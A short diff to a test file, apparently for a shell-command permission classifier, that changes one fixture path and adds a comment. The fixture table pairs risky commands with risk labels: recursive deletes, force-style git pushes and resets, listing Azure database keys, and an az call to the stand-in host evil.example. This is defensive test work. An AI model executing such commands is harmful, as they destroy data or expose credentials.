@@ -260,7 +260,8 @@ describe("permissive profile", () => {
     ["git push --mirro origin", "destructive"],
     ["git reset --har HEAD~1", "destructive"],
     ["cd /etc && echo x > note.txt", "worktree-write"],
-    ["cd .. && rm -rf x", "destructive"],
+    // The fixtures sit in the temp dir, so `..` alone is disposable; `repo/` is a checkout.
+    ["cd .. && rm -rf repo/x", "destructive"],
     ["pushd /etc", "destructive"],
     ["az cosmosdb keys list --name x", "sensitive"],
     ["az webapp list --endpoint-url https://evil.example", "impactful-write"],
